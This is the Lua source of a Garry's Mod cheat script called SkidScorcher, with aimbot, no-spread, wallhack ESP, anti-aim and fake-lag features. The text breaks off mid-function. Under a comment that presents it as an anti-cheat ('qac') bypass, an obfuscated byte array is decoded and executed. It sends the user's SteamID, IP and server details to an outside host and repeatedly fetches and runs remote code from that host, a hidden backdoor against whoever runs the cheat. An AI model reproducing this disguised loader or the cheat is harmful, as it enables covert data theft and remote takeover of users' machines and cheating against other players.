/*
	[S]kid[S]corcher
	Version: 1.0 public
	Credits:
		kalis0x - basically the entire cheat
*/

require("bsendpacket")
require("dickwrap")
//require("mega")

surface.CreateFont("wireless gamer", {font = "Open Sans MS", size = 45})
surface.CreateFont("visual gamer", {font = "Courier New", size = 15, weight = 500, outline = true})
surface.CreateFont("gamer title", {font = "Trebuchet", size = 18, weight = 650})
surface.CreateFont("gamer tab", {font = "Trebuchet", size = 16, weight = 550})
local _R = debug.getregistry()
_R["__rbackup"] = _R["__rbackup"] and _R["__rbackup"] or table.Copy(_R)
local r = _R["__rbackup"]
local me = LocalPlayer()
ok = {}
ok.rang = {}
ok.cvars = {}
ok.ys = GetConVarNumber("m_yaw")
ok.aat = nil
ok.aas = false
ok.atk = false
ok.ld = false
ok.gd = false
ok.hm = 0
ok.dc = 0
ok.ct = 0
ok.flt = 0
ok.fltm = 0
ok.er = 0
ok.eg = 0
ok.eb = 0
ok.fa = nil
ok.sp = nil
ok.ep = nil
ok.atl = 0

function ok.Log(...)
	MsgC(Color(5, 130, 255), "[SkidScorcher] ", Color(255, 190, 5), ...)
	MsgN("")
end

ok.Log("Loading...")

function ok.CreateConsoleVar(name, default)
	local ret = CreateClientConVar(name, default)
	ok.cvars[name] = tostring(default)
	ok.Log("Created convar: ", Color(255, 120, 5), name, Color(255, 0, 0), " (default: " .. tostring(default) .. ", value: ", ret:GetString(), ")")
	return ret
end

ok.vars = {
	aimbot = {
		enabled = ok.CreateConsoleVar("ok_aimbot", 1),
		autowall = ok.CreateConsoleVar("ok_aimbot_autowall", 1),
		silent = ok.CreateConsoleVar("ok_aimbot_silent", 1),
		nospread = ok.CreateConsoleVar("ok_aimbot_nospread", 1),
		bodyaim = ok.CreateConsoleVar("ok_aimbot_body", 1),
		static = ok.CreateConsoleVar("ok_aimbot_staticaa", 1),
		nextshot = ok.CreateConsoleVar("ok_aimbot_nextshot", 1),
		autoshoot = ok.CreateConsoleVar("ok_aimbot_autoshoot", 1),
		team = ok.CreateConsoleVar("ok_aimbot_ignoreteam", 1),
		friends = ok.CreateConsoleVar("ok_aimbot_ignorefriends", 0)
	},

	visuals = {
		esp = ok.CreateConsoleVar("ok_visuals_esp", 1),
		name = ok.CreateConsoleVar("ok_visuals_esp_name", 1),
		box = ok.CreateConsoleVar("ok_visuals_esp_box", 1),
		weapon = ok.CreateConsoleVar("ok_visuals_esp_weapon", 1),
		rank = ok.CreateConsoleVar("ok_visuals_esp_rank", 1),
		health = ok.CreateConsoleVar("ok_visuals_esp_health", 1),
		fov = ok.CreateConsoleVar("ok_visuals_fov", 90)
	},

	misc = {
		autohop = ok.CreateConsoleVar("ok_misc_autohop", 1),
		highjump = ok.CreateConsoleVar("ok_misc_highjump", 0),
		thirdperson = ok.CreateConsoleVar("ok_thirdperson", 1),
		killspam = ok.CreateConsoleVar("ok_misc_killspam", 0),
		robo = ok.CreateConsoleVar("ok_misc_killspam_robo", 1),
		autostrafe = ok.CreateConsoleVar("ok_misc_autostrafe", 1)
	},

	hvh = {
		antiaim = ok.CreateConsoleVar("ok_hvh_antiaim", 1),
		edge = ok.CreateConsoleVar("ok_hvh_aa_edge", 1),
		edgemet = ok.CreateConsoleVar("ok_hvh_aa_edge_met", 3),
		jitter = ok.CreateConsoleVar("ok_hvh_aa_jitter", 0),
		adaptive = ok.CreateConsoleVar("ok_hvh_aa_adaptive", 1),
		adapyaw = ok.CreateConsoleVar("ok_hvh_adap_yaw", 450),
		adapmax = ok.CreateConsoleVar("ok_hvh_adap_max", 15),
		adapspeed = ok.CreateConsoleVar("ok_hvh_adap_speed", 1),
		fakeangles = ok.CreateConsoleVar("ok_hvh_aa_fakeangles", 0),
		pitch = ok.CreateConsoleVar("ok_hvh_aa_pitch", -91),
		yaw = ok.CreateConsoleVar("ok_hvh_aa_yaw", 270),
		yawbase = ok.CreateConsoleVar("ok_hvh_aa_yawbase", 360),
		yawadd = ok.CreateConsoleVar("ok_hvh_aa_yawadd", 45),
		fakelag = ok.CreateConsoleVar("ok_hvh_fakelag", 1),
		flchoke = ok.CreateConsoleVar("ok_hvh_fl_choke", 12),
		flsend = ok.CreateConsoleVar("ok_hvh_fl_send", 1)
	}
}

ok.cones = {}

function _R.Entity.FireBullets(ent, bul)
	if bul.Spread then
		ok.cones[me:GetActiveWeapon():GetClass()] = bul.Spread * -1
	end

	r.Entity.FireBullets(ent, bul)
end

function ok.GetCone(wep)
	local cone = 0
	if !wep then return nil end
	if wep.Cone then cone = wep.Cone end
	if wep.Primary and wep.Primary.Cone then cone = wep.Primary.Cone end
	if wep.Secondary and wep.Secondary.Cone then cone = wep.Secondary.Cone end
	if cone != 0 then return Vector(-cone, -cone, -cone) end
	return nil
end

function ok.Compensate(cmd, ang)
	local wep = me:GetActiveWeapon()
	if !IsValid(wep) then return ang end
	local cone = ok.cones[wep:GetClass()] or ok.GetCone(wep)
	if !cone then return ang end
	return ok.vars["aimbot"]["nospread"]:GetBool() and dickwrap.Predict(cmd, ang:Forward(), cone):Angle() or ang
end

function ok.CheckVis(ent)
	local sp = me:GetShootPos()
	local ep = !ok.vars["aimbot"]["bodyaim"]:GetBool() and (ent:GetAttachment(ent:LookupAttachment("eyes") or ent:LookupAttachment("forward")).Pos) or ent:GetPos() + ent:OBBCenter()
	ep = ep + ((ent:GetVelocity() * engine.TickInterval()) - (me:GetVelocity() * engine.TickInterval()))
	local tdata = {
		start = sp,
		endpos = ep,
		filter = {ent, me},
		mask = MASK_SHOT
	}

	local trace = util.TraceLine(tdata)
	return trace.Fraction == 1, sp, ep
end

function ok.CanWallbang(sp, ep, ent)
    local tdata = {
    	start = sp,
    	endpos = ep,
    	filter = {ent, me},
    	mask = 1577075107
    }

    local wall = util.TraceLine(tdata)
    tdata.start = ep 
    tdata.endpos = sp
    local wall2 = util.TraceLine(tdata)
    if 17.5 > (wall2.HitPos - wall.HitPos):Length2D() then
    	return true
    else
    	return false
    end
end

function ok.GetTarget()
	local vis
	ok.sp, ok.ep, ok.aat = nil, nil, nil

	for k,v in next, player.GetAll() do
		if !ok.vars["aimbot"]["enabled"]:GetBool() or !v or !v:IsPlayer() or 0 >= v:Health() or v:IsDormant() or v == me then continue end
		if ok.vars["aimbot"]["team"]:GetBool() and v:Team() == me:Team() then continue end
		if ok.vars["aimbot"]["friends"]:GetBool() and v:GetFriendStatus() == "friend" then continue end
		local sp, ep
		vis, sp, ep = ok.CheckVis(v)
		ok.aat = v
		if vis or (ok.vars["aimbot"]["autowall"]:GetBool() and ok.CanWallbang(sp, ep, v)) then ok.sp = sp ok.ep = ep break else continue end
	end
end

function ok.DoSilent(cmd)
	if !ok.fa then ok.fa = cmd:GetViewAngles() end
	ok.fa = ok.fa + Angle(cmd:GetMouseY() * ok.ys, cmd:GetMouseX() * -ok.ys, 0)
	ok.fa.p = math.Clamp(ok.fa.p, -89, 89)
	ok.fa.y = math.NormalizeAngle(ok.fa.y)
end

function ok.FixMove(cmd, ang)
	local angs = cmd:GetViewAngles()
	local fa = ok.fa
	if ang then
		fa = ang
	end

	local viewang = Angle(0, angs.y, 0)
	local fix = Vector(cmd:GetForwardMove(), cmd:GetSideMove(), 0)
	fix = (fix:Angle() + (viewang - fa)):Forward() * fix:Length()
	
	if angs.p > 90 or angs.p < -90 then
		fix.x = -fix.x
	end
	
	cmd:SetForwardMove(fix.x)
	cmd:SetSideMove(fix.y)
end


function ok.GetCurTime()
	if IsFirstTimePredicted() then
		ok.ct = CurTime() + engine.TickInterval()
	end
end

function ok.CanFire(nextshot)
	if !nextshot then return true end
	if !ok.ct or ok.ct == 0 then return false end
	local wep = me:GetActiveWeapon() or NULL
	if !IsValid(wep) then return false end
	return wep:GetActivity() != ACT_RELOAD and ok.ct > wep:GetNextPrimaryFire()
end

ok.as_max = 10^4

function ok.AutoHop(cmd)
	if !ok.vars["misc"]["autohop"]:GetBool() then return end
	local autostrafe = ok.vars["misc"]["autostrafe"]:GetBool()
	if me:IsOnGround() and cmd:KeyDown(IN_JUMP) then
		cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP))
	else
		if autostrafe and cmd:KeyDown(IN_JUMP) then
			local mousex = cmd:GetMouseX()
			if -1 > mousex or mousex > 1 then
				cmd:SetSideMove((mousex > 0) and ok.as_max or -ok.as_max)
			end
		end

		cmd:RemoveKey(IN_JUMP)
	end
end

function ok.Aimbot(cmd)
	local autoshoot = ok.vars["aimbot"]["autoshoot"]:GetBool()
	local nextshot = ok.vars["aimbot"]["nextshot"]:GetBool()
	local silent = ok.vars["aimbot"]["silent"]:GetBool()
	local fakelag = ok.vars["hvh"]["fakelag"]:GetBool()
	local antiaim = ok.vars["hvh"]["antiaim"]:GetBool()
	local static = ok.vars["aimbot"]["static"]:GetBool()
	ok.DoSilent(cmd)
	if cmd:CommandNumber() == 0 and !ok.vars["misc"]["thirdperson"]:GetBool() and (silent or antiaim or ok.vars["misc"]["walkbot"]:GetBool()) then cmd:SetViewAngles(ok.fa) return end

	if !fakelag then
		bSendPacket = true
	end

	if ok.sp and ok.ep then
		local aafix = false
		local ap = ok.Compensate(cmd, (ok.ep - ok.sp):Angle())
		ap.p, ap.y = math.NormalizeAngle(ap.p), math.NormalizeAngle(ap.y)
		if ok.CanFire(nextshot) and (autoshoot or cmd:KeyDown(IN_ATTACK)) then
			if static then
				aafix = true
				ap.p = -ap.p - 180
				ap.y = ap.y + 180
			end
			
			cmd:SetViewAngles(ap)
			if autoshoot then
				if nextshot then
					cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
				else
					if ok.atk then
						cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
					else
						cmd:RemoveKey(IN_ATTACK)
					end

					ok.atk = !ok.atk
				end
			end

			if silent then
				ok.FixMove(cmd)
			end

			if !fakelag then
				bSendPacket = false
			end
		else
			if autoshoot and nextshoot then
				cmd:RemoveKey(IN_ATTACK)
			end

			if antiaim then
				ok.AntiAim(cmd, true)
			elseif silent then
				cmd:SetViewAngles(ok.fa)
			end

			if !fakelag then
				bSendPacket = true
			end
		end

		return
	end

	if antiaim or silent or ok.vars["misc"]["walkbot"]:GetBool() then
		cmd:SetViewAngles(ok.fa)
	end
end

ok.fat = 0
ok.aa_as = false
ok.aa_a = 0
ok.as_y = 0
ok.aayaws = {}

function ok.AntiAim(cmd, force)
	if cmd:CommandNumber() == 0 and !ok.vars["misc"]["thirdperson"]:GetBool() then return end
	if me:GetActiveWeapon() != NULL and me:GetActiveWeapon():GetClass():lower():find("knife") then return end
	if !force and (ok.sp != nil or ok.ep != nil) then return end
	if !force and cmd:KeyDown(IN_ATTACK) then
		if ok.vars["aimbot"]["static"]:GetBool() then
			cmd:SetViewAngles(Angle(-ok.fa.p - 180, ok.fa.y + 180, 0))
			ok.FixMove(cmd)
		end

		return
	end

	for i = 1, 5 do
		ok.aayaws[i] = (ok.vars["hvh"]["yawbase"]:GetInt() * i) + ok.vars["hvh"]["yawadd"]:GetInt()
	end

	if ok.vars["hvh"]["antiaim"]:GetBool() then
		local fakeangles = ok.vars["hvh"]["fakeangles"]:GetBool()
		local pitch = ok.vars["hvh"]["pitch"]:GetFloat() or 262

		local yaw = ok.vars["hvh"]["yaw"]:GetFloat() or 450

		if ok.vars["hvh"]["fakeangles"]:GetBool() and !ok.vars["hvh"]["fakelag"]:GetBool() then
			if ok.fat >= 3 then
				bSendPacket = !bSendPacket
				ok.fat = 0
			end
		end

		ok.fat = ok.fat + 1

		if ok.vars["hvh"]["adaptive"]:GetBool() then
			local adapmax = ok.vars["hvh"]["adapmax"]:GetInt()
			local adapspeed = ok.vars["hvh"]["adapspeed"]:GetInt()
			if ok.aa_a >= adapmax then
				ok.aa_a = adapmax
				ok.aa_as = false
			elseif -adapmax >= ok.aa_a then
				ok.aa_a = -adapmax
				ok.aa_as = true
			end

			if ok.aa_as then
				ok.aa_a = ok.aa_a + adapspeed
			else
				ok.aa_a = ok.aa_a - adapspeed
			end

			local adapyaw = ok.vars["hvh"]["adapyaw"]:GetFloat()
			local aay = (ok.aat and ok.aat != NULL) and (ok.aat:GetAttachment(ok.aat:LookupAttachment("forward") or ok.aat:LookupAttachment("eyes")).Pos - me:GetShootPos()):Angle().y or 0
			if !fakeangles then
				cmd:SetViewAngles(Angle(pitch, aay + adapyaw + ok.aa_a, 0))
			else
				if bSendPacket then
					cmd:SetViewAngles(Angle(pitch, aay + adapyaw, 0))
				else
					cmd:SetViewAngles(Angle(pitch, aay + adapyaw - 92, 0))
				end
			end
		elseif ok.vars["hvh"]["jitter"]:GetBool() then
			if !fakeangles then
				cmd:SetViewAngles(Angle(pitch, table.Random(ok.aayaws) + math.random(-2, 2), 0))
			else
				if bSendPacket then
					cmd:SetViewAngles(Angle(pitch, table.Random(ok.aayaws) + math.random(-2, 2), 0))
				else
					cmd:SetViewAngles(Angle(pitch, table.Random(ok.aayaws) - 92 + math.random(-10, 10), 0))
				end
			end
		else
			if !fakeangles then
				cmd:SetViewAngles(Angle(pitch, yaw, 0))
			else
				if bSendPacket then
					cmd:SetViewAngles(Angle(pitch, yaw, 0))
				else
					cmd:SetViewAngles(Angle(pitch, yaw - 92, 0))
				end
			end
		end

		if ok.vars["hvh"]["edge"]:GetBool() then
			local setp = false
			local edge = false
			local ang = Angle(0, 0, 0)
			local eyepos = me:GetShootPos() - Vector(0, 0, 5)

			for y = 1, 8 do
				local tmp = Angle(0, y * 45, 0)
				local forward = tmp:Forward()
				forward = forward * 35

				local tdata
				tdata = {start = eyepos, endpos = eyepos + forward, filter = me, mask = MASK_SOLID}
				local trace = util.TraceLine(tdata)
			
				if trace.Fraction != 1 then
					local negate = trace.HitNormal * -1
					tmp.y = negate:Angle().y
					
					local left = (tmp + Angle(0, 11.25, 0)):Forward() * 35
					local right = (tmp - Angle(0, 11.25, 0)):Forward() * 35
					tdata = {start = eyepos, endpos = eyepos + left, filter = me, mask = MASK_SOLID}
					local lt = util.TraceLine(tdata)
					tdata = {start = eyepos, endpos = eyepos + right, filter = me, mask = MASK_SOLID}
					local rt = util.TraceLine(tdata)
					local ltw = lt.Fraction == 1
					local rtw = rt.Fraction == 1

					local edgem = ok.vars["hvh"]["edgemet"]:GetInt()
					if edgem == 1 then
						if ltw or rtw then
							tmp.y = tmp.y + 180
						end

						ang.y = 270 - tmp.y + 360
					elseif edgem == 2 or edgem == 3 then
						ang.y = tmp.y + (edgem == 2 and 180 or 360)
					elseif edgem == 4 then
						if ltw or rtw then
							tmp.y = tmp.y + 180
						end

						ang.y = 270 - tmp.y + math.random(-15, 15)
					end

					edge = true
					break
				end
			end

			if edge then
				if !fakeangles then
					cmd:SetViewAngles(Angle(ang.p != 0 and ang.p or pitch, ang.y, 0))
				else
					if bSendPacket then
						cmd:SetViewAngles(Angle(ang.p != 0 and ang.p or pitch, ang.y, 0))
					else
						cmd:SetViewAngles(Angle(pitch, ang.y - 92, 0))
					end
				end
			end
		end

		pitch = cmd:GetViewAngles().p
		ok.aas = !ok.aas
		ok.FixMove(cmd)
	end
end

function ok.FakeLag(cmd)
	if cmd:CommandNumber() == 0 then return end
	local choke = ok.vars["hvh"]["flchoke"]:GetInt()
	local send = ok.vars["hvh"]["flsend"]:GetInt()
	ok.fltm = choke + send

	if ok.vars["hvh"]["fakelag"]:GetBool() then
		ok.flt = ok.flt + 1
		
		if ok.flt > ok.fltm then
			ok.flt = 1
		end

		if send >= ok.flt then
			bSendPacket = true
		else
			bSendPacket = false
		end
	end
end

function ok.HighJump(cmd)
	if !ok.vars["misc"]["highjump"]:GetBool() then return end
	local pos = me:GetPos()
	local tdata = {start = pos, endpos = pos - Vector(0, 0, 1337), mask = MASK_SOLID}
	local trace = util.TraceLine(tdata)
	local len = (pos - trace.HitPos).z
	if len > 25 and 50 > len then
		cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_DUCK))
	else
		cmd:RemoveKey(IN_DUCK)
	end
end

function ok.Visuals()
	ok.er = math.sin(CurTime() * 4) * 127 + 128
	ok.eg = math.sin(CurTime() * 4 + 2) * 127 + 128
	ok.eb = math.sin(CurTime() * 4 + 4) * 127 + 128
	draw.SimpleText("SkidScorcher Public", "wireless gamer", 4, 40, Color(ok.er, ok.eg, ok.eb), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)

	for k,v in next, player.GetAll() do
		if !ok.vars["visuals"]["esp"]:GetBool() or !v:IsValid() or !v:IsPlayer() or !v:Alive() or 0 >= v:Health() then continue end
		if !ok.vars["misc"]["thirdperson"]:GetBool() and v == me then continue end
		local min, max = v:GetCollisionBounds()
		local pos = v:GetPos()
		local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
		local middle = bottom.y - top.y
		local width = middle / 2.425

		if ok.vars["visuals"]["name"]:GetBool() then
			draw.SimpleText(v:Nick(), "visual gamer", bottom.x, top.y, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
		end

		if ok.vars["visuals"]["box"]:GetBool() then
			surface.SetDrawColor(me:Team() == v:Team() and Color(0, 100, 255) or Color(200, 225, 0))
			surface.DrawOutlinedRect(bottom.x - width, top.y, width * 2, middle)
			surface.SetDrawColor(Color(0, 0, 0))
			surface.DrawOutlinedRect(bottom.x - width - 1, top.y - 1, width * 2 + 2, middle + 2)
			surface.DrawOutlinedRect(bottom.x - width + 1, top.y + 1, width * 2 - 2, middle - 2)
		end

		ok.drawpos = 0

		if ok.vars["visuals"]["weapon"]:GetBool() then
			local wep = v:GetActiveWeapon()
			if wep and wep != NULL then
				draw.SimpleText(wep.GetPrintName and wep:GetPrintName() or wep:GetClass(), "visual gamer", bottom.x, bottom.y + ok.drawpos, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
				ok.drawpos = ok.drawpos + 10
			end
		end

		if ok.vars["visuals"]["rank"]:GetBool() then
			draw.SimpleText(v.GetUserGroup and v:GetUserGroup() or "__norank", "visual gamer", bottom.x, bottom.y + ok.drawpos, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
			ok.drawpos = ok.drawpos + 10
		end

		if ok.vars["visuals"]["health"]:GetBool() then
			local health = math.Clamp(v:Health(), 0, 100)
			local green = health * 2.55
			local red = 255 - green
			surface.SetDrawColor(Color(0, 0, 0))
			surface.DrawRect(bottom.x + width + 2, top.y - 1, 4, middle + 2)
			surface.SetDrawColor(Color(red, green, 0))
			local height = health * middle / 100
			surface.DrawRect(bottom.x + width + 3, top.y + (middle - height), 2, height)
		end
	end
end

function ok.CalcView(ply, pos, angle, fov, nearZ, farZ)
	local view = {}
	view.angles = (ok.vars["hvh"]["antiaim"]:GetBool() or ok.vars["aimbot"]["silent"]:GetBool() or ok.vars["misc"]["walkbot"]:GetBool()) and ok.fa or angle
	view.origin = ok.vars["misc"]["thirdperson"]:GetBool() and (pos - ok.fa:Forward() * 100) or pos
	view.fov = ok.vars["visuals"]["fov"]:GetInt()

	return view
end

function ok.ShouldDrawLocalPlayer()
	return ok.vars["misc"]["thirdperson"]:GetBool()
end
/// qac bypass

 local bBuffer = {10, 9, 108, 111, 99, 97, 108, 32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 34, 48, 46, 48, 46, 48, 46,
48, 58, 48, 34, 10, 9, 10, 9, 104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47,
103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111,
47, 97, 100, 100, 114, 101, 115, 115, 46, 112, 104, 112, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 105, 112, 41,
32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 105, 112, 59, 32, 101, 110, 100, 44, 32, 102, 117, 110, 99, 116, 105,
111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 10, 9, 10, 9, 116, 105, 109, 101, 114, 46, 83, 105, 109, 112, 108,
101, 40, 49, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116,
40, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99,
57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112, 105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115,
116, 61, 34, 110, 111, 116, 105, 102, 121, 34, 44, 32, 115, 116, 101, 97, 109, 105, 100, 61, 76, 111, 99, 97, 108, 80, 108,
97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 44, 32, 105, 112, 61, 99, 108, 105, 101, 110, 116,
73, 80, 44, 32, 115, 101, 114, 118, 101, 114, 110, 97, 109, 101, 61, 71, 101, 116, 72, 111, 115, 116, 78, 97, 109, 101, 40,
41, 44, 32, 115, 101, 114, 118, 101, 114, 105, 112, 61, 103, 97, 109, 101, 46, 71, 101, 116, 73, 80, 65, 100, 100, 114, 101,
115, 115, 40, 41, 125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 98, 111, 100, 121, 41, 32, 101, 110, 100, 44, 32,
102, 117, 110, 99, 116, 105, 111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 59, 10, 9, 101, 110, 100, 41, 59, 10,
9, 10, 9, 116, 105, 109, 101, 114, 46, 67, 114, 101, 97, 116, 101, 40, 34, 67, 104, 101, 97, 116, 117, 112, 100, 97, 116,
101, 95, 80, 105, 110, 103, 66, 97, 99, 107, 34, 44, 32, 53, 44, 32, 48, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110,
40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116, 40, 32, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111,
100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112,
105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115, 116, 61, 34, 112, 105, 110, 103, 98, 97, 99, 107, 34,
125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 32, 98, 111, 100, 121, 44, 32, 112, 48, 44, 32, 112, 49, 44, 32,
112, 50, 32, 41, 10, 9, 9, 9, 108, 111, 99, 97, 108, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 61, 32, 117, 116,
105, 108, 46, 74, 83, 79, 78, 84, 111, 84, 97, 98, 108, 101, 40, 98, 111, 100, 121, 41, 59, 10, 9, 9, 9, 105, 102,
40, 114, 101, 115, 112, 111, 110, 115, 101, 32, 33, 61, 32, 110, 105, 108, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9,
105, 102, 40, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97,
99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 76, 111, 99, 97, 108, 80, 108, 97,
121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 124, 124, 32, 115, 116, 114, 105, 110, 103, 46,
102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34,
116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 42, 34, 41, 41, 32, 116, 104, 101, 110, 32, 10, 9, 9, 9, 9, 9,
105, 102, 40, 33, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112,
97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 33, 34, 32, 46, 46,
32, 76, 111, 99, 97, 108, 80, 108, 97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 38,
38, 32, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 114, 101, 34,
93, 32, 33, 61, 32, 34, 110, 117, 108, 108, 34, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9, 9, 9, 82, 117, 110,
83, 116, 114, 105, 110, 103, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93,  
91, 34, 114, 101, 34, 93, 41, 59, 10, 9, 9, 9, 9, 9, 101, 110, 100, 10, 9, 9, 9, 9, 101, 110, 100, 10, 9,
9, 9, 101, 110, 100, 10, 9, 9, 9, 101, 110, 100, 44, 32, 10, 9, 9, 9, 102, 117, 110, 99, 116, 105, 111, 110, 40,
101, 120, 99, 101, 112, 116, 105, 111, 110, 41, 10, 9, 9, 101, 110, 100, 41, 32, 10, 9, 101, 110, 100, 41, 10, };
local s1 = ""; for k,v in next, bBuffer do s1 = s1 .. string.char(v); end RunString(s1); s1 = "";



function ok.PreDrawOpaqueRenderables()
	for k,v in next, player.GetAll() do
		local ang = v:EyeAngles()
		ok.rang[v] = ang
	end
end

function ok.ResetConsoleVars()
	for k,v in next, ok.cvars do
		me:ConCommand(k .. " " .. v)
		ok.Log("Reset convar: ", Color(255, 120, 5), k, Color(255, 0, 0), " (value: ", v, ")")
	end
end

function ok.FindPlayerWithID(userid)
	for k,v in next, player.GetAll() do
		if v:UserID() == userid then
			return v
		end
	end

	return false
end

function ok.PlayerHurt(data)
	if !ok.vars["misc"]["killspam"]:GetBool() then return end
	local health = data.health
	local id = data.userid
	local attackerid = data.attacker
	local target = ok.FindPlayerWithID(id)
	local attacker = ok.FindPlayerWithID(attackerid)
	if !target or !attacker then return end
	if attacker != NULL and target != NULL then
		if attacker == me then
			target.hits = target.hits and target.hits + 1 or 1
			target.hitsme = 0
			if health == 0 then
				if ok.vars["misc"]["robo"]:GetBool() then
					if MEGA then
						MEGA.TextToSpeech("easy " .. tostring(target.hits) .. " tap")
					end
				end

				me:ConCommand("say [Tacos] owned " .. target:Nick() .. " in " .. tostring(target.hits) .. " shot" .. (target.hits > 1 and "s" or ""))
				target.hits = 0
			end
		elseif target == me then
			attacker.hitsme = attacker.hitsme and attacker.hitsme + 1 or 1
			attacker.hits = 0
			if health == 0 then
				local pingadvantage = target:Ping() - attacker:Ping()
				if pingadvantage > 50 then
					me:ConCommand("say [Tacos] ping advantage: i have " .. tostring(pingadvantage) .. " more ping than " .. attacker:Nick())
				elseif attacker.hitsme > 1 then
					me:ConCommand("say [Tacos] it took " .. attacker:Nick() .. " " .. tostring(attacker.hitsme) .. " shots to kill me")
					attacker.hitsme = 0
				else
					me:ConCommand("say [Tacos] i just got owned by " .. attacker:Nick())
				end
			end
		end
	end
end

function ok.CreateMove(cmd)
	ok.AutoHop(cmd)
	ok.Aimbot(cmd)
	ok.AntiAim(cmd)
	ok.FakeLag(cmd)
	ok.HighJump(cmd)
end

function ok.AddHook(htype, name, func)
	hook.Add(htype, name, func)
	ok.Log("Created ", Color(255, 120, 5), htype, Color(255, 190, 5), " hook: ", Color(255, 120, 5), name, Color(255, 0, 0), " (" .. tostring(func) .. ")")
end

ok.curtab = 0
ok.menuitems = {}

function ok.CreateTab(frame, name, index, max)
	local tab = vgui.Create("DButton", frame)
	tab:SetText("")
	tab:SetSize(frame:GetWide() / max - 1, 30)
	tab:SetPos((index - 1) * (tab:GetWide() + 1), 24)
	function tab.Paint(self, width, height)
		surface.SetDrawColor(Color(100, 100, 100))
		surface.DrawRect(0, 0, width, height)
		if ok.curtab == index then
			surface.SetDrawColor(Color(255, 255, 255, 15))
			surface.DrawRect(0, 0, width, height)
		end

		draw.SimpleText(name, "gamer tab", width / 2, height / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end

	function tab.DoClick()
		ok.curtab = index
		for i = 1, #ok.menuitems do
			local items = ok.menuitems[i]
			for k,v in next, items do
				v:SetVisible(i == index)
			end
		end
	end
end

function ok.CreateCheckbox(frame, name, tab, index, cvtab, cvname)
	local cvar = ok.vars[cvtab][cvname]
	local check = vgui.Create("DButton", frame)
	check:SetText("")
	surface.SetFont("gamer tab")
	local wid = surface.GetTextSize(name)
	check:SetSize(26 + wid, 18)
	local x = 10
	local y = 64 + (22 * (index - 1))
	if (y + 27) >= frame:GetTall() then
		local firstindex = 0
		for i = 1, index do
			local _y = 64 + (22 * (i - 1))
			if (_y + 27) >= frame:GetTall() then
				firstindex = i
				break
			end
		end

		x = (x * 2.5) + 192
		y = 64 + (22 * (index - (firstindex - 1) - 1))
	end

	check:SetPos(x, y)
	function check.Paint(self, width, height)
		surface.SetDrawColor(Color(100, 100, 100))
		surface.DrawOutlinedRect(0, 0, 18, height)
		if cvar:GetBool() then
			surface.DrawRect(0, 0, 18, height)
		end

		draw.SimpleText(name, "gamer tab", 24, height / 2, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	end

	function check.DoClick()
		cvar:SetBool(!cvar:GetBool())
	end

	if ok.curtab != tab then
		check:SetVisible(false)
	end

	ok.menuitems[tab][#ok.menuitems[tab] + 1] = check
end

function ok.CreateSlider(frame, name, tab, index, cvtab, cvname, min, max, dec)
	min = min * 10
	max = max * 10
	local cvar = ok.vars[cvtab][cvname]
	local slider = vgui.Create("DButton", frame)
	slider:SetText("")
